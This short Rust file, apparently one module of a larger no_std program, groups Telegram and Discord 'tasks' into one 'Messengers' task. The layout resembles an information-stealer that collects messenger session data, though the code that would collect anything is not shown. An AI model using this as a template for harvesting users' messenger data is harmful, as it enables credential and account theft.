#![no_std]
#![allow(unsafe_op_in_unsafe_fn)]

use crate::alloc::borrow::ToOwned;
mod telegram;
mod discord;

extern crate alloc;

use alloc::vec;
use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
use crate::discord::DiscordTask;
use crate::telegram::TelegramTask;

pub struct MessengersTask {
    inner: CompositeTask
}

impl MessengersTask {
    pub fn new() -> Self {
        Self {
            inner: composite_task!(
                TelegramTask,
                DiscordTask
            )
        }
    }
}

impl_composite_task_runner!(MessengersTask, "Messengers");